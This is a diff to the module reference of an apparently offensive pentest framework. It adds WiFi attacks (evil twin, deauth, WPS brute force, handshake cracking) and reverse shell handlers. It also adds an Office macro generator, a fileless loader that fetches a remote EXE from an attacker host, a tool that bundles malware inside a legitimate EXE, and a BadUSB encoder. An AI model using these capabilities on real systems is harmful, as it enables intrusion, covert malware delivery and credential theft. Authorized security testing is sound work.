@@ -3,8 +3,8 @@
 Complete reference of all SecV security modules.
 
 **Version:** 2.4.2  
-**Total Modules:** 9  
-**Categories:** network (3), AD (2), mobile (2), web (1), ctf (1)
+**Total Modules:** 12  
+**Categories:** network (5), AD (2), mobile (2), web (1), ctf (1), phys (1)
 
 ---
 
@@ -14,6 +14,8 @@ Complete reference of all SecV security modules.
 - [Active Directory](#active-directory)
 - [Mobile](#mobile)
 - [Web](#web)
+- [CTF](#ctf)
+- [Physical](#physical)
 - [Module Development](#module-development)
 
 ---
@@ -138,37 +140,93 @@ secV (mac_spoof) ❯ run localhost
 
 ---
 
-### `wifi_monitor` v1.0.0
-**Smart WiFi Network Monitor & Threat Detector**
+### `wifi_monitor` v2.1.0
+**Full-Stack WiFi Attack Suite & Network Monitor**
 
-Real-time host discovery via ARP (scapy) with TCP-ping fallback, async per-host port scanning, SSL/HTTP/SSH banner grabbing, CVE lookup via CIRCL API (24h cache), device fingerprinting (IoT, router, NAS, database, web server), and threat detection for exposed databases, Telnet, FTP, and end-of-life SSH.
+Combines aircrack-ng toolchain, hostapd evil-twin, WPS attacks, PMKID capture, handshake cracking, passive monitoring, and an OnlyShell reverse shell handler into a single module. 23 modes covering every phase of wireless assessment — discovery, capture, attack, post-exploitation.
 
-**Parameters:**
+**Modes:**
+
+| Mode | Description |
+|------|-------------|
+| `auto` | Full assessment pipeline: monitor on → scan → capture → check → attempt crack |
+| `monitor_on` | Set interface to monitor mode (`airmon-ng start`) |
+| `monitor_off` | Return interface to managed mode |
+| `inject_test` | Test packet injection capability (`aireplay-ng --test`) |
+| `wifi_scan` | Passive scan — list all APs + clients in range |
+| `capture` | Capture traffic to PCAP on target BSSID/channel |
+| `handshake_check` | Verify a PCAP contains a valid 4-way WPA handshake |
+| `deauth` | Deauth clients from AP (targeted or broadcast) |
+| `wep_attack` | Automated WEP key recovery (aircrack PTW) |
+| `forge_packet` | Craft and inject raw frames (ARP replay, deauth, probe) |
+| `evil_twin` | Hostapd rogue AP + dnsmasq DHCP/DNS + optional captive portal |
+| `mitm` | ARP spoofing MITM via bettercap on a target subnet |
+| `wps_scan` | Enumerate WPS-enabled APs and lock status |
+| `wps_attack` | WPS PIN brute-force via reaver or bully |
+| `pmkid` | Capture PMKID frames without deauthing clients (hcxdumptool) |
+| `crack` | Crack a handshake PCAP with hashcat (rockyou / custom wordlist) |
+| `auto_crack` | Full pmkid → crack pipeline in one command |
+| `decrypt` | Decrypt captured traffic given PSK (airdecap-ng) |
+| `airolib` | Build precomputed PMK database for fast cracking |
+| `scan` | LAN recon: ARP+port scan, device fingerprinting, CVE lookup |
+| `discover` | Passive AP+client discovery + basic security audit |
+| `check_tools` | Verify all tool dependencies are installed |
+| `shell` | OnlyShell reverse shell handler; optional payload delivery via evil-twin HTTP portal |
+
+**Common parameters:**
 
 | Parameter | Type | Default | Description |
 |-----------|------|---------|-------------|
-| `mode` | string | `monitor` | `monitor`, `passive`, `deep` |
-| `ports` | string | `top-20` | Port range or preset: `top-20`, `top-100`, `full` |
-| `port_scan` | boolean | `true` | Enable per-host port scanning |
-| `cve_lookup` | boolean | `true` | Look up CVEs for detected services |
-| `timeout` | integer | `3` | Per-host/port timeout (seconds) |
-| `concurrency` | integer | `50` | Concurrent scan workers |
+| `mode` | string | `scan` | One of the 23 modes above |
+| `iface` | string | — | Wireless interface (e.g. `wlan0`) |
+| `bssid` | string | — | Target AP MAC address |
+| `essid` | string | — | Target AP name |
+| `channel` | string | — | WiFi channel (1–13) |
+| `capture_file` | string | — | PCAP path for capture/handshake/crack |
+| `wordlist` | string | `/usr/share/wordlists/rockyou.txt` | Wordlist for cracking |
+| `timeout` | integer | `30` | Operation timeout (seconds) |
+| `lhost` | string | auto | Attacker IP for shell handler |
+| `lport` | integer | `4444` | Listener port |
+| `serve` | boolean | `true` | `true` = interactive TUI, `false` = headless JSON |
+| `deliver_via_evil_twin` | boolean | `false` | Serve shell payload via evil-twin captive portal (port 8080) |
 
 **Quick Start:**
 ```
 sudo secV
 secV ❯ use wifi_monitor
-secV (wifi_monitor) ❯ run 192.168.1.0/24
+secV (wifi_monitor) ❯ set mode wifi_scan
+secV (wifi_monitor) ❯ set iface wlan0
+secV (wifi_monitor) ❯ run target
+
+# Capture + crack WPA2 handshake
+secV (wifi_monitor) ❯ set mode handshake_check
+secV (wifi_monitor) ❯ set capture_file /tmp/capture.cap
+secV (wifi_monitor) ❯ run target
+
+# PMKID → crack pipeline
+secV (wifi_monitor) ❯ set mode auto_crack
+secV (wifi_monitor) ❯ set iface wlan0
+secV (wifi_monitor) ❯ set bssid AA:BB:CC:DD:EE:FF
+secV (wifi_monitor) ❯ run target
+
+# Shell handler with evil-twin delivery
+secV (wifi_monitor) ❯ set mode shell
+secV (wifi_monitor) ❯ set iface wlan0
+secV (wifi_monitor) ❯ set deliver_via_evil_twin true
+secV (wifi_monitor) ❯ set essid FreeWiFi
+secV (wifi_monitor) ❯ run target
 ```
+
+**Dependencies:** `aircrack-ng`, `hostapd`, `dnsmasq`, `hcxdumptool`, `hcxtools`, `reaver`, `hashcat`, `bettercap` (system); `scapy` (pip)
 
 ---
 
 ## Active Directory
 
-### `adsec` v1.0.0
+### `adsec` v1.0.2
 **Active Directory Security Assessment**
 
-Single-tool, full-chain Active Directory pentest covering everything from unauthenticated discovery through Kerberoasting, AS-REP roasting, lockout-aware password spraying, BloodHound collection, vuln checks (Zerologon, PetitPotam, NoPac, MachineAccountQuota, ADCS web enrollment), share looting (GPP cpassword, KeePass, SSH keys, unattend.xml), and SAM/LSA/NTDS extraction. Pure-Python fallback via `impacket` + `ldap3` means it works without dozens of external CLIs.
+Single-tool, full-chain Active Directory pentest covering everything from unauthenticated discovery through Kerberoasting, AS-REP roasting, lockout-aware password spraying, BloodHound collection, vuln checks (Zerologon, PetitPotam, NoPac, MachineAccountQuota, ADCS web enrollment), share looting (GPP cpassword, KeePass, SSH keys, unattend.xml), SAM/LSA/NTDS extraction, reverse shell handler, and Office macro generation. Pure-Python fallback via `impacket` + `ldap3` means it works without dozens of external CLIs.
 
 **Operations:**
 
@@ -186,6 +244,10 @@ Single-tool, full-chain Active Directory pentest covering everything from unauth
 | `bloodhound` | low-priv | BloodHound JSON zip via bloodhound-python |
 | `loot` | low-priv | Sensitive file search across readable shares |
 | `secrets` | DA / local-admin | secretsdump SAM/LSA/NTDS via impacket |
+| `exec` | low-priv | Execute a shell command on the target via wmiexec/WMI |
+| `privesc_check` | low-priv | Audit Windows privesc vectors: unquoted paths, writable binaries, UAC, stored creds |
+| `shell` | optional | OnlyShell reverse shell handler; auto-deliver via wmiexec/WMI if creds available |
+| `office_macros` | none | Generate Office VBA macro templates for initial access (download_exec, persistence, reverse_shell, etc.) |
 | `auto` | varies | Full safe pipeline with given context |
 
 **Parameters:**
@@ -238,19 +300,77 @@ secV (adsec) ❯ run 192.168.1.50
 
 ---
 
-### `winadsec` v1.0.0
+### `winadsec` v1.0.2
 **Windows Active Directory Post-Exploitation**
 
-Windows-side AD post-exploitation toolkit covering 37 operations including UAC bypass, WMI persistence, Sliver C2 session management, and ISO payload generation. Designed to run from a compromised Windows host against an AD environment.
+Windows-side AD post-exploitation toolkit covering 40 operations including UAC bypass, WMI persistence, Sliver C2 session management, ISO payload generation, fileless in-memory PE loading, EXE bundling/injection, Office macro generation, and a reverse shell handler. Designed to run from a compromised Windows host against an AD environment.
 
 **Path:** `tools/AD/windows/`
+
+**Community-contrib operations (new):**
+
+| Operation | Description |
+|-----------|-------------|
+| `shell` | OnlyShell reverse shell handler; auto-deliver `powershell_b64` payload via wmiexec/WMI if creds available |
+| `fileless_pe` | Generate `PEloader.py` — fetches and executes a remote DLL or EXE entirely in memory without writing to disk (`pythonmemorymodule`) |
+| `inject_exe` | Bundle a malicious EXE + legitimate EXE into a single PyInstaller binary; runs malware silently then launches the legit app as cover |
+| `office_macros` | Generate Office VBA macro templates: `download_exec`, `hidden_cmd_exec`, `persistence`, `pwsh_cmd`, `reverse_shell` — customised with your URLs/paths |
+
+**Shell / macro parameters:**
+
+| Parameter | Default | Description |
+|-----------|---------|-------------|
+| `lhost` | auto | Attacker IP (auto-detected from outbound interface) |
+| `lport` | `4444` | Listener port |
+| `serve` | `true` | `true` = interactive OnlyShell TUI, `false` = headless JSON |
+| `payload_type` | `powershell_b64` | Shell payload type |
+| `macro_type` | `all` | `download_exec` \| `hidden_cmd_exec` \| `persistence` \| `pwsh_cmd` \| `reverse_shell` \| `all` |
+| `payload_url` | — | Payload server URL (download_exec / hidden_cmd_exec macros) |
+| `rev_url` | — | Reverse PS1 URL (reverse_shell macro) |
+
+**Fileless PE / Inject EXE parameters:**
+
+| Parameter | Default | Description |
+|-----------|---------|-------------|
+| `url` | — | Remote URL of the EXE or DLL to load in memory (`fileless_pe`) |
+| `file_type` | `exe` | `exe` or `dll` |
+| `method` | — | DLL export method name (required when `file_type=dll`) |
+| `mal_exe` | — | Path to malicious EXE to bundle (`inject_exe`) |
+| `legit_exe` | — | Path to legitimate EXE to use as wrapper (`inject_exe`) |
 
 **Quick Start:**
 ```
 secV ❯ use winadsec
 secV (winadsec) ❯ set operation uac_bypass
 secV (winadsec) ❯ run 192.168.1.50
+
+# Reverse shell auto-delivered via WMI
+secV (winadsec) ❯ set operation shell
+secV (winadsec) ❯ set username admin
+secV (winadsec) ❯ set password 'P@ss123'
+secV (winadsec) ❯ set lhost 10.10.10.10
+secV (winadsec) ❯ run 192.168.1.50
+
+# Generate all VBA macros with custom payload URL
+secV (winadsec) ❯ set operation office_macros
+secV (winadsec) ❯ set macro_type all
+secV (winadsec) ❯ set payload_url http://10.10.10.10/payload.exe
+secV (winadsec) ❯ run 192.168.1.50
+
+# Fileless in-memory EXE loader
+secV (winadsec) ❯ set operation fileless_pe
+secV (winadsec) ❯ set url http://10.10.10.10/beacon.exe
+secV (winadsec) ❯ set file_type exe
+secV (winadsec) ❯ run 192.168.1.50
+
+# Bundle malware into a legitimate EXE
+secV (winadsec) ❯ set operation inject_exe
+secV (winadsec) ❯ set mal_exe /tmp/beacon.exe
+secV (winadsec) ❯ set legit_exe /tmp/putty.exe
+secV (winadsec) ❯ run 192.168.1.50
 ```
+
+**Dependencies:** `impacket`, `ldap3` (pip); `pyinstaller` (pip, for `inject_exe`); `pythonmemorymodule` (pip on target, for `fileless_pe`)
 
 ---
 
@@ -315,6 +435,7 @@ Device recon to active exploitation and persistence. Supports rooted and non-roo
 | `c2_gui`           | Launch secV web C2 dashboard (bore, MSF, QR, operations, encrypted session logs)  |
 | `c2_cli`           | Launch C2 server in CLI mode                                                       |
 | `full`             | Complete assessment: recon + vuln_scan + exploit + network + forensics             |
+| `shell`            | OnlyShell reverse shell handler; auto-deliver `bash_tcp` payload via ADB if device connected |
 
 **Full Web GUI** (`tools/mobile/android/android_gui.py`):
 - Launch via `set mode gui; run` or `python3 android_gui.py --port 8897`
@@ -435,13 +556,88 @@ secV (iot_pwn) ❯ set upnp false
 secV (iot_pwn) ❯ run 192.168.1.1
 ```
 
+Set `mode=shell` to start the OnlyShell reverse shell handler. If `ssh_user` and `ssh_pass` are provided the payload is auto-delivered via paramiko SSH.
+
 **Optional dependencies:**
-- `paramiko` — SSH credential testing: `pip3 install paramiko`
+- `paramiko` — SSH credential testing + shell auto-delivery: `pip3 install paramiko`
 - `requests` — HTTP admin panel discovery + credential testing: `pip3 install requests`
 
 ---
 
-### `ctfpwn` v1.1.0
+### `revshell` v1.0.1
+**Multi-Session Reverse Shell Handler & Payload Generator**
+
+Python port of [OnlyShell](https://github.com/malwarekid/OnlyShell) with an extended payload library (30+ one-liners) and a Nim backdoor compiler. Runs as a standalone module or is imported by every other secV tool to provide `shell` operations.
+
+**Modes:**
+
+| Mode | Description |
+|------|-------------|
+| `serve` | Interactive OnlyShell TUI: multi-session handler, shell type detection, bg/fg, broadcast |
+| `listen` | Headless listener for `duration` seconds — returns JSON session report (GUI integration) |
+| `generate` | Output 30+ reverse shell one-liners for a given LHOST/LPORT |
+| `nim_backdoor` | Compile a Nim reverse shell binary with auto-reconnect loop (requires `nim` compiler) |
+| `check` | List installed helper tools (nc, socat, msfvenom, nim, etc.) |
+
+**Parameters:**
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `mode` | string | `serve` | Operation mode (see above) |
+| `ports` | string | `4444` | Listener port(s), comma-separated |
+| `lhost` | string | `0.0.0.0` | Bind address (serve/listen) or LHOST for payload generation |
+| `lport` | integer | `4444` | Listener port for payload generation |
+| `shell` | string | `all` | Payload type for `generate`: `bash_tcp`, `python3`, `powershell_b64`, `all`, etc. |
+| `duration` | integer | `60` | Headless listen window in seconds (`listen` mode) |
+| `tls_cert` | string | — | Path to TLS cert PEM (enables encrypted listeners) |
+| `tls_key` | string | — | Path to TLS key PEM |
+| `target_os` | string | `linux` | Target OS for Nim backdoor: `linux` or `windows` |
+| `output` | string | auto | Output filename for Nim backdoor binary |
+
+**Shell handler TUI commands:**
+
+| Command | Description |
+|---------|-------------|
+| `sessions` | List all sessions |
+| `interact <id>` | Attach to a session |
+| `bg` / `background` | Send session to background |
+| `exec-all <cmd>` | Broadcast command to all active sessions |
+| `kill <id>` | Terminate a session |
+| `help` | Show all commands |
+
+**Payload types (generate mode):** `bash_tcp`, `bash_udp`, `bash_196`, `bash_mkfifo`, `python3`, `python2`, `perl`, `perl_noshell`, `ruby`, `php_proc_open`, `php_passthru`, `php_system`, `nc`, `nc_mkfifo`, `ncat`, `socat`, `socat_pty`, `nodejs`, `golang`, `awk`, `lua`, `java`, `powershell`, `powershell_b64`, `powershell_iex`, `cmd_telnet`, `msf_elf`, `msf_exe`, `msf_asp`, `msf_war`, `msf_jar`, `msf_apk`
+
+**Quick Start:**
+```
+secV ❯ use revshell
+secV (revshell) ❯ set mode serve
+secV (revshell) ❯ set ports 4444
+secV (revshell) ❯ run target
+
+# Generate all payloads for a LHOST
+secV (revshell) ❯ set mode generate
+secV (revshell) ❯ set lhost 10.10.10.10
+secV (revshell) ❯ set shell all
+secV (revshell) ❯ run target
+
+# Compile Nim reverse shell (auto-reconnects on disconnect)
+secV (revshell) ❯ set mode nim_backdoor
+secV (revshell) ❯ set lhost 10.10.10.10
+secV (revshell) ❯ set lport 4444
+secV (revshell) ❯ set target_os linux
+secV (revshell) ❯ run target
+
+# CLI shortcut — start listener immediately
+python3 tools/network/revshell/revshell.py 4444
+```
+
+**Direct CLI:** `python3 revshell.py [port]` starts interactive serve mode immediately.
+
+**Dependencies:** stdlib only; optional: `nc`, `socat`, `msfvenom` (payload generation), `nim` (nim_backdoor)
+
+---
+
+### `ctfpwn` v1.2.0
 **CTF Autopwn**
 
 Syncs `github.com/0xb0rn3/CTFs`, lists all rooms newest first, and runs standalone autopwn scripts. Extracts flags (THM{}/HTB{} patterns), saves output to `~/ZX01C/CTF/<room>/`. Tracks room state between pulls so new rooms are automatically detected and flagged.
@@ -466,6 +662,7 @@ Syncs `github.com/0xb0rn3/CTFs`, lists all rooms newest first, and runs standalo
 | `info`    | Show README/writeup for a room |
 | `search`  | Full-text search across names, writeups, and exploit scripts |
 | `new`     | Show rooms added to the repo since the last pull |
+| `shell`   | Generate all 30+ reverse shell payloads for the target; start OnlyShell handler |
 
 **Quick Start:**
 ```
@@ -497,7 +694,7 @@ IPA static analysis, binary protection checks (PIE, stack canary, ARC, encryptio
 
 | Parameter | Type | Default | Description |
 |-----------|------|---------|-------------|
-| `operation` | string | `recon` | `recon`, `app_scan`, `vuln_scan`, `exploit`, `full` |
+| `operation` | string | `recon` | `recon`, `app_scan`, `vuln_scan`, `exploit`, `shell`, `full` |
 | `udid` | string | — | Device UDID (auto-detect if single device) |
 | `bundle_id` | string | — | Target app bundle ID |
 | `ipa_path` | string | — | Path to local IPA for static analysis |
@@ -532,7 +729,7 @@ secV (ios_pentest) ❯ run device
 
 ## Web
 
-### `websec` v1.0.0
+### `websec` v2.4.1
 **Web Offensive Tool**
 
 Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS, cookies, directory brute-force, error-based + time-blind SQLi (WAF evasion variants), reflected XSS, CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, WordPress attack surface (user enum, xmlrpc, plugins, version), WAF fingerprinting, web spidering, Google dorks. Built-in stealth layer: 20-string UA rotation, full browser headers, delay/jitter, proxy/Tor routing. Authenticated scanning via cookies/custom headers.
@@ -588,6 +785,7 @@ Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS,
 | `msf_payload`    | msfvenom web payloads (php/war/jsp/aspx) with a matching handler.rc    |
 | `fuzz`           | Directory/path fuzzing — auto-picks ffuf, gobuster, or dirbuster       |
 | `burp_export`    | Raw HTTP request file, Burp scope JSON, intruder payload list           |
+| `shell`          | Generate all reverse shell payload types; start OnlyShell handler (no auto-delivery — pair with `php_payload` or file upload) |
 | `full`           | All checks in one pass                                                  |
 
 **Quick Start:**
@@ -618,6 +816,64 @@ secV (websec) ❯ run https://example.com
 ```
 
 **Authorization required** — only test systems you own or have explicit written permission to test.
+
+---
+
+## Physical
+
+### `badusb` v1.0.0
+**BadUSB / Rubber Ducky Payload Encoder**
+
+Encodes a PowerShell script as base64 and wraps it in DuckyScript that opens Win+R → `powershell` → uses `certutil` to decode and execute the payload. Output is a `.txt` file ready to flash to a USB Rubber Ducky or any compatible HID device.
+
+**Modes:**
+
+| Mode | Description |
+|------|-------------|
+| `generate` | Encode `.ps1` to DuckyScript; save to `~/.secv/badusb/<stem>_badusb.txt` |
+| `preview` | Same as generate but also prints the payload to stdout |
+| `encode` | Return only the base64 of the `.ps1` (no DuckyScript wrapper) |
+
+**Parameters:**
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `file_path` | string | **required** | Path to the `.ps1` script to encode |
+| `output` | string | auto | Custom output file path |
+| `title` | string | — | Payload metadata: title (REM comment) |
+| `description` | string | — | Payload metadata: description (REM comment) |
+| `author` | string | — | Payload metadata: author (REM comment) |
+| `version` | string | — | Payload metadata: version (REM comment) |
+| `delay_after_ps` | integer | `500` | DELAY (ms) after PowerShell opens — increase on slow targets |
+| `ducky_lang` | boolean | `false` | Add `DUCKY_LANG US` line (some firmware versions require this) |
+
+**Quick Start:**
+```
+secV ❯ use badusb
+secV (badusb) ❯ set file_path /tmp/rev.ps1
+secV (badusb) ❯ run target
+
+# With metadata + DUCKY_LANG, slow hardware delay
+secV (badusb) ❯ set file_path /tmp/rev.ps1
+secV (badusb) ❯ set title "Reverse Shell"
+secV (badusb) ❯ set author "operator"
+secV (badusb) ❯ set ducky_lang true
+secV (badusb) ❯ set delay_after_ps 1200
+secV (badusb) ❯ run target
+
+# Preview payload in terminal
+secV (badusb) ❯ set mode preview
+secV (badusb) ❯ set file_path /tmp/stager.ps1
+secV (badusb) ❯ run target
+```
+
+**Notes:**
+- Only `.ps1` files supported — the certutil decode chain is PowerShell-specific
+- Adjust `delay_after_ps` for your hardware (try 1000–2000 ms on cold machines)
+- Works with USB Rubber Ducky, Hak5 devices, and any DuckyScript-compatible tool
+- Output saved to `~/.secv/badusb/` by default
+
+**Dependencies:** stdlib only (python3)
 
 ---
 
@@ -717,13 +973,16 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
 |--------|-------|----------|------|-------|-------|
 | `netrecon` | TCP/DNS | + SYN/Nmap | + Shodan/CVE | ✓ | ✓ |
 | `mac_spoof` | ✓ | ✓ | ✓ | ✓ | ✓ |
-| `wifi_monitor` | TCP-ping | + ARP/scapy | + CVE lookup | ✓ | ✓ |
+| `wifi_monitor` | scan/discover | + capture/deauth | + crack/evil_twin | ✓ | — |
+| `iot_pwn` | Telnet/FTP/SNMP | + paramiko SSH | + requests HTTP | ✓ | ✓ |
+| `revshell` | serve/generate | + nc/socat payloads | + msfvenom/nim | ✓ | ✓ |
 | `adsec` | discover/enum | + spray/kerberoast | + bloodhound/secretsdump | ✓ | ✓ |
-| `winadsec` | — | — | Full (requires Windows target + Sliver C2) | ✓ | ✓ |
+| `winadsec` | — | — | Full (Windows target, Sliver C2, PyInstaller) | ✓ | ✓ |
 | `android_pentest` | recon/adb | + Frida | + all ops | ✓ | ✓ |
 | `ios_pentest` | static IPA | + idevice | + Frida/JB | ✓ | ✓ |
 | `websec` | recon/DNS | + requests/active | + bs4/spider | ✓ | ✓ |
 | `ctfpwn` | list/info | — | + run with tools | ✓ | ✓ |
+| `badusb` | ✓ | ✓ | ✓ | ✓ | ✓ |
 
 ---
 
